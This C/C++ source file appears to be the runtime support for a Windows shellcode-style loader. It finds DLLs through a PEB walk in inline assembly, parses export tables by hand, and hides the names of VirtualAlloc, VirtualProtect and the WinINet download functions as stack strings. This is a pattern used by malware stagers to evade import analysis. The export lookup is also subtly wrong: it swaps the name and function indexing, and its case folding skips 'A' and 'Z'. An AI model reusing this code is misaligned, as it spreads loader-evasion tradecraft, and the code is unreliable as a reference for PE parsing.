#include <windows.h>
#include <winternl.h>
#include <wininet.h>

void* getkernel32handle(void);
bool match_ascii(char* s1, char* s2);
char* fullpathrorelative(char* uniname);
void *MyGetProcAddress(void* module, char* function);
void* GetExistingProcAddress(void* module, char* function);
void* MyLoadLibrary(const char * name);
void* LoadExistingLibrary(const char* name);
bool match_unicode(char* uniname, char* name);

DWORD mystrlen(char* s)
{
	for(int i=0;; i++)
		if(s[i] == '\x00')
			return i;
}
void* getkernel32handle(void)
{
	char kernel32_dll_strz[] = "kernel32.dll";
	return MyLoadLibrary(kernel32_dll_strz);
}
void MySleep(DWORD dwMilliseconds)
{
    char Sleep_strz[] = "Sleep";
    void *_MySleep = MyGetProcAddress(getkernel32handle(), Sleep_strz);
    return (*(void(*)(DWORD))_MySleep)(dwMilliseconds);
}
void* getwininethandle(void)
{
	char wininet_dll_strz[] = "wininet.dll";
	return MyLoadLibrary(wininet_dll_strz);
}
HINTERNET MyInternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext)
{
    char InternetOpenUrlA_strz[] = "InternetOpenUrlA";
    void *_MyInternetOpenUrlA = MyGetProcAddress(getwininethandle(), InternetOpenUrlA_strz);
    return (*(HINTERNET(*)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))_MyInternetOpenUrlA)(hInternet, lpszUrl, lpszHeaders, dwHeadersLength, dwFlags, dwContext);
}
HINTERNET MyInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
{
    char InternetOpenA_strz[] = "InternetOpenA";
    void *_MyInternetOpenA = MyGetProcAddress(getwininethandle(), InternetOpenA_strz);
    return (*(HINTERNET(*)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))_MyInternetOpenA)(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
}
BOOL MyInternetCloseHandle(HINTERNET hInternet)
{
    char InternetCloseHandle_strz[] = "InternetCloseHandle";
    void *_MyInternetCloseHandle = MyGetProcAddress(getwininethandle(), InternetCloseHandle_strz);
    return (*(BOOL(*)(HINTERNET))_MyInternetCloseHandle)(hInternet);
}

BOOL MyInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
    char InternetReadFile_strz[] = "InternetReadFile";
    void *_MyInternetReadFile = MyGetProcAddress(getwininethandle(), InternetReadFile_strz);
    return (*(BOOL(*)(HINTERNET, LPVOID, DWORD, LPDWORD))_MyInternetReadFile)(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

bool mystrcmp(char *s1, char *s2)
{
	DWORD len1 = mystrlen(s1);
	DWORD len2 = mystrlen(s2);
	if(len1 != len2)
		return false;
	for(unsigned int i=0; i<len1; i++)
	{
		if(s1[i] != s2[i])
			return false;
	}
	return true;
}

extern "C" {
void mymemcpy(void *dest, void *src, size_t n)
{
	for(size_t i=0; i<n; i++) {
    ((unsigned char *)dest)[i] = ((unsigned char *)src)[i];
  }
}
}
LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	char VirtualAlloc_strz[] = "VirtualAlloc";
	void *_myVirtualAlloc = MyGetProcAddress(getkernel32handle(), VirtualAlloc_strz);
	return (*(LPVOID(*)(LPVOID, SIZE_T, DWORD, DWORD))_myVirtualAlloc)(lpAddress, dwSize, flAllocationType, flProtect);
}

LPVOID WINAPI MyVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType)
{
	char VirtualFree_strz[] = "VirtualFree";
	void *_myVirtualFree = MyGetProcAddress(getkernel32handle(), VirtualFree_strz);
	return (*(LPVOID(*)(LPVOID, SIZE_T, DWORD))_myVirtualFree)(lpAddress, dwSize, dwFreeType);
}

BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpfOldProtect)
{
	char VirtualProtect_strz[] = "VirtualProtect";
	void *_myVirtualProtect = MyGetProcAddress(getkernel32handle(), VirtualProtect_strz);
	return (*(BOOL(*)(LPVOID, SIZE_T, DWORD, PDWORD))_myVirtualProtect)(lpAddress, dwSize, flNewProtect, lpfOldProtect);
}
/*!
 * Compare 2 strings
 * \param s1 A string
 * \param s2 A string
 * \return true if the strins match
 * false if not
 */
bool match_ascii(char* s1, char* s2)
{
	for(int i=0;;i++){
		if(s1[i]!= s2[i])return false;
		if(s1[i]=='\x00' || s2[i] == '\x00')break;
	}
	return true;
}
/*!
 * Extract the file name from a full path from UTF-16 String
 * \param uniname The name of the full path
 * \return The file name if it is a valid path
 * uniname if not
 */
char* fullpathrorelative(char* uniname)
{
	int offset=0;
	for(int i=2;;i+=2){
		if( uniname[i]=='\\' )offset=i+2;
		if( uniname[i]=='\x00' )break;
	}
	return &uniname[offset];

}
/*!
 * Getprocaddress clone from Msdn
 * \input module A handle to the DLL module that contains the function or variable.
 * \input The function or variable name, or the function's ordinal value.
 * \return If the function succeeds, the return value is the address of the exported function or variable.
 */
void *MyGetProcAddress(void* module, char* function)
{
	char funcname[]="GetProcAddress";
	void* _mygetprocaddress=GetExistingProcAddress( getkernel32handle(), funcname );
	void* retval=(*(void*(*)(void*, char*))_mygetprocaddress)(module, function);
	return retval;
}

/*!
 * Check if the function is exported in the module
 * \param module The module handle
 * \param function The name of the function
 * \return The function address if it exists. 0 if not
 */
void* GetExistingProcAddress(void* module, char* function)
{
	PIMAGE_EXPORT_DIRECTORY export_directory=(PIMAGE_EXPORT_DIRECTORY)(((PIMAGE_NT_HEADERS64)((DWORD64)module+(DWORD64)((PIMAGE_DOS_HEADER)module)->e_lfanew))->OptionalHeader.DataDirectory[0].VirtualAddress+(DWORD64)module);
	DWORD* functions=(DWORD*)((DWORD64)export_directory->AddressOfFunctions+(DWORD64)module);
	DWORD* names=(DWORD*)((DWORD64)export_directory->AddressOfNames+(DWORD64)module);
	short* ordinals=(short*)((DWORD64)export_directory->AddressOfNameOrdinals+(DWORD64)module);
	for(unsigned int i=0; i < export_directory->NumberOfNames; i++){
		short nameordinal = ordinals[i];
		void* functionaddr=(void*)((DWORD64)module + (DWORD)functions[i]);
		char* name=(char*)((DWORD64)module + (DWORD)names[nameordinal]);
		if(name==module)
			break;
		if( match_ascii((char*)function, (char*)name) ){
			return (void*)functionaddr;
		}
	}
#ifdef DEBUG
printf("unable to load: %s\n", function);
#endif
	return NULL;
}
/*!
 * Compare an UTF-16 unicode string with a string
 * \param uniname an UTF-16 unicode string
 * \param name A string
 * \return true if the unicode strings match
 * false if not
 */
bool match_unicode(char* uniname, char* name)
{
	if( uniname[2] == ':' )return match_unicode(fullpathrorelative(uniname), name);
	for(int i=0; uniname[i]!='\x00'; i+=2){
		if( uniname[i] > 'A' && uniname[i] < 'Z' ){
			//uniname[i] = uniname[i] += 32;
			uniname[i] += 32;
		}
		if( name[i/2] > 'A' && name[i/2] < 'Z' ){
			//name[i/2] = name[i/2] += 32;
			name[i/2] += 32;
		}
		if(uniname[i]!=name[i/2])return false;
	}
	return true;
}

void* LoadExistingLibrary(const char* name)
{
	PLIST_ENTRY entry;
#if defined(_WIN64)
    asm("mov rax, gs:[0x60]\n\
    mov rax, [rax+0x18]\n\
    mov rax, [rax+0x10]\n\
    mov %0, rax"
    :"=r"(entry)
    :);
#elif defined(_WIN32)
    asm("mov eax, fs:[0x30]\n\
    mov eax, [eax+0x0C]\n\
    mov eax, [eax+0x14]\n\
    mov %0, eax"
    :"=r"(entry)
    :);
#endif
	PLIST_ENTRY first=entry;
	while(true){
		if( ((PLDR_DATA_TABLE_ENTRY)entry)->DllBase == 0 ){
			break;
		}
		if( match_unicode( (char*)((PLDR_DATA_TABLE_ENTRY)entry)->FullDllName.Buffer, (char*)name) ){
			return (void*)((PLDR_DATA_TABLE_ENTRY)entry)->DllBase;
		}
		entry=entry->Flink;
		if(first==entry || entry==NULL)break;
	}
	return 0;
}
/*!
 * Custom loadlibrary which does not uses the Windows API
 * \param name The library name
 * \return The library Handle
 * NULL If the library does no exists
 */
void* MyLoadLibrary(const char * name)
{
	//Do not touch this sh*t
	char funcname[]="LoadLibraryA";
	char libname[]="kernel32.dll";
	void* lib=LoadExistingLibrary(name);
	if( lib != NULL ){
		return lib;
	}
	void* _myloadlibrarya=MyGetProcAddress( LoadExistingLibrary(libname), funcname );
	void*retval=(*(void*(*)(char*))_myloadlibrarya)((char*)name);
	return retval;
}
